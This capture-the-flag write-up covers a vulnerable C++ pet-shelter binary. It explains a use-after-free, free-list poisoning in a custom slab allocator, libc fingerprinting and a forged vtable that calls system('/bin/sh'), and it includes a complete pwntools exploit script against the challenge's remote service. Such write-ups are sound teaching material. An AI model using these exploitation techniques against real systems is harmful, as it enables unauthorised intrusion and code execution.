# PWN#004 — C++ vtable UAF in a custom slab allocator

**Flag:** `CTF{cd8831a9ea1fa9b3ab39da0ad921964aABIVaaaaaaaaa}`  
**Service:** `nc 169.58.126.107 5007`  
**Flag format:** `CTF{}`

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `pets` (ELF x86-64 PIE, stripped) | 18,568 | `7efc91dc4317f306943bd093be1768b251029d6589dbd9ebb2f7fe82ad579602` |

## Challenge

> PWN#004 — 100 points. Get a shell on the remote host and read the flag.

The handout is a stripped C++ binary that implements a small "Pet Shelter" menu: add/remove a pet
(cat or dog), poke a pet with up to 32 bytes, make a pet speak, and add/remove/peek notes of up to
0x500 bytes. The remote wrapper is visible from inside the container:

```text
socat TCP-LISTEN:5000,reuseaddr,fork EXEC:/challenge/pets,su=nobody
```

The process runs as `nobody` with cwd `/challenge`; the flag is at `/flag/flag.txt` and is also
present in the `FLAG` environment variable.

## Analysis

### Binary and protections

`file` reports an ELF 64-bit LSB PIE, dynamically linked, stripped, built with
`GCC: (Debian 14.2.0-19) 14.2.0`, BuildID `bd715ba486e3daf1a2fe10356c4aad9ffafcbbba`.

* PIE — every code and data address in this writeup is `pie + offset`.
* Full RELRO — `.dynamic` has `BIND_NOW` and a `GNU_RELRO` segment covers `.got`.
* NX — `GNU_STACK` is `RW` with no `E` flag.
* Stack canary — `__stack_chk_fail` plus `%fs:0x28` checks in every function.

The binary imports `libstdc++.so.6` and `libc.so.6`; there is no `system`/`execve` import, so a libc
base is required. `pop rdi; ret` does not exist in the binary and there is no `syscall` instruction.

### Menu and object layout

Eight visible options plus a hidden ninth one that the menu never prints:

```text
1) Add pet  2) Remove pet  3) Poke pet  4) Speak pet
5) Add note 6) Remove note 7) Peek note 8) Exit
```

Pets are 0x20-byte heap objects: a vtable pointer at `+0x00` and the name at `+0x08`. The global
tables are plain arrays of 16 entries:

| Symbol | Offset | Notes |
|---|---:|---|
| `pets[16]` | `0x50a0` | object pointers, never cleared on remove |
| `notes[16]` | `0x5120` | data pointers, never cleared on remove |
| `note_sizes[16]` | `0x51a0` | requested size, kept after free |
| `.got.plt` | `0x4f60` | `setvbuf`, `printf`, `write`, `strchr`, ... |
| Cat vtable | `0x4cb0` | slot 0 = `"%s says meow"` printer |
| Dog vtable | `0x4c88` | slot 0 = `"%s says woof"` printer |
| Command vtable | `0x4c60` | slot 0 = `Command::execute` |

### Custom slab allocator

Requests up to 0x80 are served from one `new(0x4000)` slab with three size classes — the rodata
table at `0x3010` holds `{0x20, 0x40, 0x80}`. Class lookup is a linear scan of that table
(`0x1219`): a size that matches no class goes to `operator new`, and a matching class with an empty
free list is carved from the slab's bump pointer.

The per-class free list is stored in the free chunk itself, XOR-obfuscated with a rotation of the
chunk's own address:

```c
free(o):  o[0] = head ^ rol(o, 7);  head = o;
alloc():  o = head;  head = o[0] ^ rol(o, 7);  return o;
```

The key is not secret: it only needs the address of the chunk being freed, which the challenge
leaks for free (see below). Whoever controls `o[0]` of the current head decides what the next
allocation returns.

### Use-after-free and Poke

Neither `pets[]` nor `notes[]` is zeroed by the remove handlers, so a removed pet stays reachable
through menu 3. `Poke` is a plain `memcpy(pets[i], buf, n)` with `n <= 32`, executed at the start
of the object — including on a chunk that is already on the free list. That is both a vtable
overwrite and a free-list link forgery.

Note that `Remove` calls `vtable[1](obj)` with no validation at all, while `Speak` is the only
operation that checks the vtable pointer against the three known tables and prints
`[protection] rejected: vtable pointer not in whitelist.` on a mismatch.

### Hidden option 9

The menu dispatch table at `0x31a8` has ten entries. Option 9 reaches a handler that prints the
first qword of `pets[i]`:

```c
printf("%p\n", *(void **)pets[idx]);
```

There is no check that the slot is live, so this single option provides both leaks:

* on a live cat it prints `pie + 0x4cb0`;
* on a freed pet it prints the obfuscated free-list link `head ^ rol(obj, 7)`, and since the
  freed chunk is the head, `head` is 0 and the value is exactly `rol(obj, 7)`.

### Command::execute

The whitelisted `Command` vtable at `0x4c60` has a slot 0 at `0x243a` that decrypts and calls a
function pointer held in the object:

```asm
2455:  lea    0x8(%rax),%rax        ; rax = obj + 8
2465:  mov    (%rax),%rax
2468:  movabs $0x5f3759df2f2f2f2f,%rdx
2472:  xor    %rdx,%rax             ; fn = *(obj+8) ^ 0x5f3759df2f2f2f2f
2490:  add    $0x8,%rdx             ; rdx = obj + 16
2494:  mov    %rdx,%rdi             ; rdi = obj + 16
2497:  call   *%rax
```

So `Speak` on a forged `Command` is `fn(obj + 16)` with `rdi` pointing at bytes we fully control.
With `fn = system`, the command string lives at `obj + 16` and no stack pivot is needed at all.

### Remote libc

Reading `.got.plt` through the arbitrary read gives the resolved libc pointers. One sample run:

```text
setvbuf  0x7f7e9eebd470
printf   0x7f7e9ee95dc0
write    0x7f7e9ef41ee0
strchr   0x7f7e9efa4880
```

The difference `setvbuf - printf = 0x276b0` together with the low page offsets `printf = 0xdc0`,
`setvbuf = 0x470` matched exactly three builds in the libc.rip database:
`libc6_2.43-5_amd64`, `libc6_2.43-6_amd64` and `libc6_2.43-7_amd64` — i.e. Debian glibc 2.43.
All three share `printf = 0x5adc0`, `system = 0x541b0`, `environ = 0x1eede8`, `setcontext = 0x45e80`.

The base was then confirmed from the target itself: the 32 bytes at `base` are the ELF header
(`7f454c4602010103...`) and the 32 bytes at `base + 0x541b0` are `system`'s prologue
(`4885ff740be946fbffff...`), which matches `libc6_2.43-5` and `-6` byte for byte.

## Solution

### 1. PIE and slab leak

```python
s.add_pet(0, 0, b"NAME0")
pie = s.vptr(0) - CAT_VT      # option 9 on a live Cat  -> pie + 0x4cb0
s.remove_pet(0)               # chunk 0 goes to the class-0 free list
obj = ror(s.vptr(0))          # option 9 on the freed chunk -> rol(obj, 7)
```

`obj` is the address of the freed 0x20 chunk, and `pets[0]` still points at it. From here on that
dangling slot is the anchor used to rewrite the free-list head.

### 2. Forged allocation: arbitrary 32-byte write

`cycle(T, payload)` performs one full turn of the allocator (body of `Exploit.cycle`):

```python
s.poke(0, p64(T ^ rol(self.obj)) + b"F" * 24)   # obj[0] = T ^ key  -> next = T
s.add_note(a, 32, b"Y" * 32)                    # pop obj, head := T
s.add_note(b, 32, payload.ljust(32, ZERO))      # pop T, write at T
s.remove_note(a)                                # push obj back as head
```

Two notes of size 32 use the 0x20 class, so both allocations come from the forged list. The second
one returns `T` and writes 32 attacker bytes there. `a` and `b` are note slots that are not part of
the 32-byte region being written (and slot 1 is reserved for the read window), so the write does
not clobber its own bookkeeping.

### 3. Arbitrary read and libc base

The same cycle is reused to arm a persistent read window. `notes[1]` is overwritten with a target
address; `Peek note` then writes up to `min(size, 0x20)` bytes from `notes[1]` to stdout:

```python
T = self.pie + NOTES + 8 * self.W
self.cycle(T, p64(addr), a, b)        # notes[1] = addr
return self.s.peek_note(self.W)[:32]
```

The first arming call is self-referential: the forged chunk *is* the address of `notes[1]`, so the
payload lands in the slot that is about to be dereferenced. Later calls only rewrite the same
slot. One read of `pie + 0x4f60` yields the four GOT entries above, hence
`libc = printf - 0x5adc0`.

### 4. Identifying the remote libc

The GOT values were fingerprinted against local copies first (glibc 2.35/2.39/2.41) and none
matched. The `setvbuf - printf` delta and the two low page offsets were then submitted to
libc.rip's `/api/find`, which returned only glibc 2.43 builds; the base was verified by reading
the ELF header and `system`'s prologue back from the target. No libc file was shipped with the
challenge, but the remote `/challenge` directory does contain `libc.so.6` (2,014,248 bytes) next
to the loader and the binary.

### 5. One Poke to a shell

With `pie`, `obj` and `libc` known, the free list is emptied and a fresh pet is allocated:

```python
s.poke(0, p64(rol(obj)) + b"F" * 24)   # link decrypts to 0 -> next alloc from the bump pointer
s.add_pet(1, 0, b"x\n")
payload = p64(pie + CMD_VT) + p64((libc + LIBC_SYSTEM) ^ CMD_XOR) + b"/bin/sh" + ZERO
s.poke(1, payload)
```

`Speak` on pet 1 passes the whitelist (`pie + 0x4c60`), `Command::execute` decrypts `obj + 8` into
`system` and calls it with `rdi = obj + 16 = "/bin/sh"`. The shell inherits the socket, so the next
line sent on the connection is a shell command.

## Exploit code

```python
#!/usr/bin/env python3
"""PWN#004 (pets): vtable UAF -> arbitrary R/W -> system("/bin/sh")."""
import struct
import time

from pwn import remote, log

HOST, PORT = "169.58.126.107", 5007

MASK = (1 << 64) - 1
ZERO = bytes([0])

CAT_VT = 0x4CB0            # Cat vtable
DOG_VT = 0x4C88            # Dog vtable
CMD_VT = 0x4C60            # Command vtable (slot 0 = execute)
CMD_XOR = 0x5F3759DF2F2F2F2F

NOTES = 0x5120             # notes[16]
GOT = 0x4F60               # .got.plt, setvbuf first

LIBC_PRINTF = 0x5ADC0      # glibc 2.43 (Debian libc6 2.43-5/6)
LIBC_SYSTEM = 0x541B0


def rol(v, n=7):
    v &= MASK
    return ((v << n) | (v >> (64 - n))) & MASK


def ror(v, n=7):
    v &= MASK
    return ((v >> n) | (v << (64 - n))) & MASK


def p64(x):
    return struct.pack("<Q", x & MASK)


def x64(b):
    b = bytes(b)
    return struct.unpack("<Q", b[:8])[0] if len(b) >= 8 else 0


class Shelter:
    def __init__(self, host=HOST, port=PORT, timeout=25):
        self.r = remote(host, port, timeout=timeout)
        self.r.recvuntil(b"> ", timeout=10)

    def _c(self, n):
        self.r.send(b"%d\n" % n)

    def add_pet(self, idx, kind=0, name=b"AAAA"):
        self._c(1)
        self.r.recvuntil(b"Index (0-15): ")
        self._c(idx)
        self.r.recvuntil(b"Kind (0=cat, 1=dog): ")
        self._c(kind)
        self.r.recvuntil(b"Name: ")
        self.r.send(name)
        self.r.recvuntil(b"> ", timeout=5)

    def remove_pet(self, idx):
        self._c(2)
        self.r.recvuntil(b"Index: ")
        self._c(idx)
        self.r.recvuntil(b"> ", timeout=5)

    def poke(self, idx, data):
        assert len(data) <= 32
        self._c(3)
        self.r.recvuntil(b"Index: ")
        self._c(idx)
        self.r.recvuntil(b"Bytes (up to 32): ")
        self.r.send(data)
        self.r.recvuntil(b"> ", timeout=5)

    def add_note(self, idx, size, content=b""):
        self._c(5)
        self.r.recvuntil(b"Index (0-15): ")
        self._c(idx)
        self.r.recvuntil(b"Size: ")
        self._c(size)
        self.r.recvuntil(b"Content: ")
        self.r.send(content)
        self.r.recvuntil(b"> ", timeout=5)

    def remove_note(self, idx):
        self._c(6)
        self.r.recvuntil(b"Index: ")
        self._c(idx)
        self.r.recvuntil(b"> ", timeout=5)

    def peek_note(self, idx):
        self._c(7)
        self.r.recvuntil(b"Index: ")
        self._c(idx)
        data = self.r.recvuntil(b"> ", timeout=5)
        assert data.startswith(b"Note: "), data[:24]
        data = data[len(b"Note: "):]
        cut = data.find(b"\n1) Add pet")
        if cut >= 0:
            data = data[:cut]
        return data

    def vptr(self, idx):
        """Hidden option 9: printf("%p\n", pets[idx]->vptr)."""
        self._c(9)
        self.r.recvuntil(b"Index: ")
        self._c(idx)
        out = self.r.recvuntil(b"\n", timeout=5)[:-1]
        return 0 if out == b"(nil)" else int(out, 16)

    def close(self):
        try:
            self.r.close()
        except Exception:
            pass


class Exploit:
    W = 1                  # notes[1] stays armed with the current read target

    def __init__(self, s):
        self.s = s
        self.work = list(range(16))
        self.pie = 0
        self.obj = 0
        self.armed = False

    def leak(self):
        s = self.s
        s.add_pet(0, 0, b"NAME0")
        self.pie = s.vptr(0) - CAT_VT          # live Cat -> pie + 0x4cb0
        s.remove_pet(0)                        # chunk 0 -> class-0 free list
        self.obj = ror(s.vptr(0))              # link is rol(obj, 7)
        log.success("pie=%#x slab/heap obj=%#x", self.pie, self.obj)

    def cycle(self, T, payload, a, b):
        """Forge the head link so that the second alloc returns T and writes there."""
        s = self.s
        s.poke(0, p64(T ^ rol(self.obj)) + b"F" * 24)
        s.add_note(a, 32, b"Y" * 32)                    # pop obj, head := T
        s.add_note(b, 32, payload.ljust(32, ZERO))      # pop T, write at T
        s.remove_note(a)                                # push obj back

    def _consume(self, *slots):
        for x in slots:
            if x in self.work:
                self.work.remove(x)

    def _covered(self, T):
        """Note slots whose own address lies inside [T, T+32)."""
        out = set()
        for k in range(16):
            if T <= self.pie + NOTES + 8 * k < T + 32:
                out.add(k)
        return out

    def _wk(self, avoid):
        cand = [x for x in self.work if x not in avoid]
        assert len(cand) >= 2, (self.work, avoid)
        return cand[0], cand[1]

    def read(self, addr, n=32):
        T = self.pie + NOTES + 8 * self.W
        cov = self._covered(T)
        if not self.armed:
            cand = [x for x in self.work if x not in cov or x == self.W]
            a = cand[0] if cand[0] != self.W else cand[1]
            b = self.W                              # write into notes[1] itself
            self.armed = True
        else:
            cand = [x for x in self.work if x not in cov]
            a, b = cand[0], cand[1]
        self.cycle(T, p64(addr), a, b)
        self._consume(a, b)
        return self.s.peek_note(self.W)[:n]


def exploit(cmd=b"/bin/sh"):
    s = Shelter()
    e = Exploit(s)
    e.leak()
    got = e.read(e.pie + GOT)                       # forged alloc -> arbitrary read
    libc = x64(got[8:16]) - LIBC_PRINTF             # GOT[1] = printf
    log.success("pie=%#x slab=%#x libc=%#x", e.pie, e.obj, libc)

    # empty the class-0 free list: the link decrypts to 0, so the next pet
    # is handed out by the bump pointer
    s.poke(0, p64(rol(e.obj)) + b"F" * 24)

    # obj[0]   = whitelisted Command vtable
    # obj[8]   = system ^ 0x5f3759df2f2f2f2f  (Command::execute decrypts it)
    # obj[16:] = command string, because execute() calls fn(obj + 16)
    s.add_pet(1, 0, b"x\n")
    payload = p64(e.pie + CMD_VT) + p64((libc + LIBC_SYSTEM) ^ CMD_XOR) + cmd + ZERO
    assert len(payload) <= 32, len(payload)
    s.poke(1, payload)
    return s


def readall(s, timeout=1.5):
    out = b""
    while True:
        try:
            d = s.r.recv(timeout=timeout)
        except Exception:
            break
        if not d:
            break
        out += d
    return out


def main():
    s = exploit()
    s.r.send(b"4\n")
    s.r.recvuntil(b"Index: ", timeout=5)
    s.r.send(b"1\n")                                # Speak -> execute -> system
    time.sleep(0.6)
    readall(s, 0.5)

    s.r.send(b"cat /flag/flag.txt; echo RC=$?\n")
    time.sleep(0.3)
    out = readall(s, 2.5)
    print(out.decode("utf-8", "replace"))
    s.close()


if __name__ == "__main__":
    main()
```

## Notes

* The odd tail inside the braces (`ABIVaaaaaaaaa`) is literally what the remote `FLAG` variable and
  `/flag/flag.txt` contained; it is not a transcription artefact.
* `Speak` is the only checked call site. `Remove` invokes `vtable[1]` without any whitelist check,
  which is a second, unused path to the same effect.
* The first attempt at the final step tried a `setcontext` pivot built across 15 contiguous pets
  and crashed with no output. The pivot failed because `Command::execute` calls `fn(obj + 16)`,
  not `fn(obj + 8)`; the fake `ucontext` was therefore read from the wrong base. Once the call
  convention was read correctly, a single `Poke` was enough and the whole pivot was dropped.
* The free list must be drained (link decrypting to 0) before allocating the pet that gets poked,
  otherwise the allocator returns a recycled chunk that still carries a stale link.
* `read()` arms `notes[1]` self-referentially on the first call. Writing 32 bytes at that address
  also zeroes `notes[2..4]`, so those slots must not be reused for the forging cycle afterwards.
* ASLR changes every connection: `pie`, `slab` and `libc` are all re-leaked per run, and the
  hard-coded `printf`/`system` offsets only hold for the glibc 2.43 runtime on the target.
